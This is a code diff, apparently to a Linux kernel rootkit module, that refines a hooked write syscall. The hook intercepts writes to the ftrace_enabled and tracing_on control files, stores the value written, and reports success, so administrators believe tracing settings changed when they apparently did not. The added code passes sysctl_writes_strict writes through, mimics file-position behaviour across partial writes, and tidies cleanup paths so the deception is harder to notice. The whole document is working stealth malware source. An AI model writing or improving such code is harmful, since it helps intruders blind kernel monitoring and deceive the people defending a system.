@@ -116,6 +116,53 @@ static notrace bool is_real_tracing_on(struct file *file)
     return true;
 }
 
+static notrace bool is_sysctl_writes_strict(struct file *file)
+{
+    const char *name = NULL;
+    struct dentry *dentry;
+    struct super_block *sb;
+    struct dentry *parent;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    
+    if (dentry->d_name.name)
+        name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "sysctl_writes_strict") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    if (strcmp(sb->s_type->name, "proc") != 0 && 
+        strcmp(sb->s_type->name, "sysfs") != 0)
+        return false;
+    
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    
+    if (strcmp(parent->d_name.name, "kernel") != 0)
+        return false;
+    
+    parent = parent->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    
+    if (strcmp(parent->d_name.name, "sys") != 0)
+        return false;
+    
+    return true;
+}
+
 static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                      bool compat32, bool has_offset)
@@ -124,11 +171,16 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
     const char __user *user_buf;
     size_t count;
     struct file *file;
-    char *kernel_buf;
+    char *kernel_buf = NULL;
     size_t len;
     size_t i, start, end;
     long parsed_value;
     int ret;
+    ssize_t result = -EINVAL;
+    bool is_sysctl_strict = false;
+    bool is_ftrace = false;
+    bool is_tracing = false;
+    loff_t pos;
 
     if (!orig || !regs)
         return -EINVAL;
@@ -147,23 +199,39 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
     if (!file)
         return orig(regs);
 
-    if (!is_real_ftrace_enabled(file) && !is_real_tracing_on(file)) {
+    is_sysctl_strict = is_sysctl_writes_strict(file);
+    is_ftrace = is_real_ftrace_enabled(file);
+    is_tracing = is_real_tracing_on(file);
+    pos = file->f_pos;
+
+    if (!is_ftrace && !is_tracing && !is_sysctl_strict) {
         fput(file);
         return orig(regs);
     }
 
-    fput(file);
+    if (is_sysctl_strict) {
+        fput(file);
+        return orig(regs);
+    }
 
-    if (count == 0)
+    if (pos == 0) {
+        ftrace_write_intercepted = false;
+    }
+
+    if (count == 0) {
+        fput(file);
         return -EINVAL;
+    }
 
     kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
-    if (!kernel_buf)
+    if (!kernel_buf) {
+        fput(file);
         return -ENOMEM;
+    }
 
     if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE))) {
-        kfree(kernel_buf);
-        return -EFAULT;
+        result = -EFAULT;
+        goto out;
     }
 
     len = min(count, (size_t)BUF_SIZE - 1);
@@ -179,23 +247,38 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
             c == '-' ||                
             c == ' ' || c == '\t' ||
             c == '\n' || c == '\r' || 
+            c == '\f' || c == '\v' ||
             c == '\0') {             
             continue;
         }
         
-        kfree(kernel_buf);
-        return -EINVAL;
+        result = -EINVAL;
+        goto out;
     }
 
     start = 0;
     while (start < len && (kernel_buf[start] == '\0' || 
                            kernel_buf[start] == ' ' || 
-                           kernel_buf[start] == '\t'))
+                           kernel_buf[start] == '\t' ||
+                           kernel_buf[start] == '\f' ||
+                           kernel_buf[start] == '\v'))
         start++;
 
     if (start >= len) {
-        kfree(kernel_buf);
-        return count;
+        file->f_pos += count;
+        result = count;
+        goto out;
+    }
+
+    if (pos != 0) {
+        if (!ftrace_write_intercepted) {
+            result = -EINVAL;
+            goto out;
+        } else {
+            file->f_pos += count;
+            result = count;
+            goto out;
+        }
     }
 
     end = start;
@@ -208,42 +291,45 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
         end++;
 
     if (end == start) {
-        kfree(kernel_buf);
-        return -EINVAL;
+        result = -EINVAL;
+        goto out;
     }
 
     if (kernel_buf[start] == '+') {
-        kfree(kernel_buf);
-        return -EINVAL;
+        result = -EINVAL;
+        goto out;
     }
 
     if ((end - start) > 20) {
-        kfree(kernel_buf);
-        return -EINVAL;
+        result = -EINVAL;
+        goto out;
     }
 
     kernel_buf[end] = '\0';
 
     ret = kstrtol(kernel_buf + start, 0, &parsed_value);
     if (ret != 0) {
-        kfree(kernel_buf);
-        return -EINVAL;
+        result = -EINVAL;
+        goto out;
     }
 
     if (parsed_value > INT_MAX || parsed_value < INT_MIN) {
-        kfree(kernel_buf);
-        return -EINVAL;
+        result = -EINVAL;
+        goto out;
     }
-
-    kfree(kernel_buf);
 
     i = snprintf(saved_ftrace_value, sizeof(saved_ftrace_value), "%ld\n", parsed_value);
     if (i >= sizeof(saved_ftrace_value))
         saved_ftrace_value[sizeof(saved_ftrace_value) - 1] = '\0';
 
     ftrace_write_intercepted = true;
+    file->f_pos += count;
+    result = count;
 
-    return count;
+out:
+    kfree(kernel_buf);
+    fput(file);
+    return result;
 }
 
 static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
